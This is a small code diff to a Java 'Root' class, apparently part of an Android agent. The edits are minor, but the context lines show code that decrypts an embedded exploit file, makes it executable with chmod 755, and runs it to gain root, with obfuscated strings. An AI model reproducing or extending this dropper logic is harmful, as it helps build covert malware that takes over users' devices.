@@ -28,6 +28,7 @@ import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.Properties;
+import java.util.concurrent.Semaphore;
 
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
@@ -517,7 +518,6 @@ public class Root {
 			fileWrite(exploitCheck, stream, Cfg.RNDDB);
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
-
 			int ret = Execute.execute(path + M.e("/ecs")).exitCode;
 
 			if (Cfg.DEBUG) {
@@ -740,8 +740,7 @@ public class Root {
 		return Status.haveRoot();
 	}
 
-	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
-			FileNotFoundException {
+	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException {
 		try {
 			InputStream in = decodeEnc(stream, passphrase);
 
